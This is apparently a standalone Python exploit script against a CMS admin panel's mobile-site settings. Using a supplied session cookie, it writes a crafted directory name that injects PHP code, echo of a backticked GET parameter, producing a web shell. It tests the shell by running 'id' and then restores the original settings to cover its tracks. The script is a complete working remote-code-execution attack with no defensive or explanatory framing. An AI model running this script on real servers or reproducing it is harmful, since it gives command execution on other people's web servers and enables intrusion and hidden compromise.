import sys, re, requests

b = sys.argv[1].rstrip("/")
ck = sys.argv[2]
e = sys.argv[3] if len(sys.argv) > 3 else "admin.php"
s = requests.Session()
s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120"
s.headers["Cookie"] = ck
a = b + "/" + e
p = "zzmob/x');echo `$_GET[0]`;#/.."
r = s.get(a, allow_redirects=False)
print("entry          HTTP", r.status_code, flush=True)
if r.status_code == 404:
    print("admin entry not found: /%s" % e)
    sys.exit(1)

r = s.get(a + "?s=cms&c=site_mobile&m=index", allow_redirects=False)
print("session        HTTP", r.status_code, flush=True)
if r.status_code != 200:
    print("invalid session: cookie expired or User-Agent mismatch")
    sys.exit(1)

h = s.get(a + "?s=cms&c=site_mobile&m=index").text
form = dict(re.findall(r'name="([^"]+)"[^>]*?value="([^"]*)"', h))
mm = re.search(r'name="data\[mode\]"[^>]*value="([^"]*)"[^>]*checked', h)
omode, odir = (mm.group(1) if mm else "0"), form.get("data[dirname]", "")

r = s.post(a + "?s=cms&c=site_mobile&m=index", data={"data[mode]": "1", "data[dirname]": p})
print("write-mobile   HTTP", r.status_code, r.text[:110].replace("\n", " "), flush=True)
print(s.get(b + "/zzmob/index.php?0=id").text[:200])

s.post(a + "?s=cms&c=site_mobile&m=index", data={"data[mode]": omode, "data[dirname]": odir})
print("restored")
